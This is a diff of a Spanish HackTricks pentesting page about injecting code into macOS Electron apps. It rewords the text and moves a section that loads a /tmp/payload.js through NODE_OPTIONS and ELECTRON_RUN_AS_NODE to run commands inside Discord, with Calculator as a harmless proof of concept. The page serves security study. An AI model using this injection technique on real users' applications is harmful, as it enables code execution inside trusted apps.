@@ -12,14 +12,30 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-Ten en cuenta que ahora la mayoría de las aplicaciones de Electron ignorarán los parámetros de node (como --inspect) cuando se lanzan a menos que se establezca la variable de entorno **`ELECTRON_RUN_AS_NODE`**.
+Tenga en cuenta que ahora las aplicaciones de Electron **fortificadas** ignorarán los parámetros de nodo (como --inspect) cuando se inicien a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté establecida.
 
-Sin embargo, aún puedes usar el parámetro de electron `--remote-debugging-port=9229`, pero la carga útil anterior no funcionará para ejecutar otros procesos.
+Sin embargo, aún podría usar el parámetro de electron `--remote-debugging-port=9229`, pero la carga útil anterior no funcionará para ejecutar otros procesos.
 {% endhint %}
 
+## `NODE_OPTIONS`
+
+{% hint style="warning" %}
+Esta variable de entorno solo funcionaría si la aplicación de Electron no ha sido fortificada adecuadamente y lo permite. Si está fortificada, también deberá usar la **variable de entorno `ELECTRON_RUN_AS_NODE`**.
+{% endhint %}
+
+Con esta combinación, podría almacenar la carga útil en un archivo diferente y ejecutar ese archivo:
+
+{% code overflow="wrap" %}
+```bash
+# Content of /tmp/payload.js
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+
+# Execute
+NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
+```
 ## `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-Según [**la documentación**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si se establece esta variable de entorno, iniciará el proceso como un proceso Node.js normal. 
+Según [**la documentación**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si esta variable de entorno está establecida, iniciará el proceso como un proceso normal de Node.js. 
 
 {% code overflow="wrap" %}
 ```bash
@@ -54,20 +70,6 @@ Como se [propone aquí](https://www.trustedsec.com/blog/macos-injection-via-thir
 </dict>
 </plist>
 ```
-### `ELECTRON_RUN_AS_NODE` y `NODE_OPTIONS` &#x20;
-
-Con esta combinación se puede almacenar el payload en un archivo diferente y ejecutar ese archivo:
-
-{% code overflow="wrap" %}
-```bash
-# Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
-
-# Execute
-NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
-```
-{% endcode %}
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
@@ -75,7 +77,7 @@ NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Di
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live).
 * **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
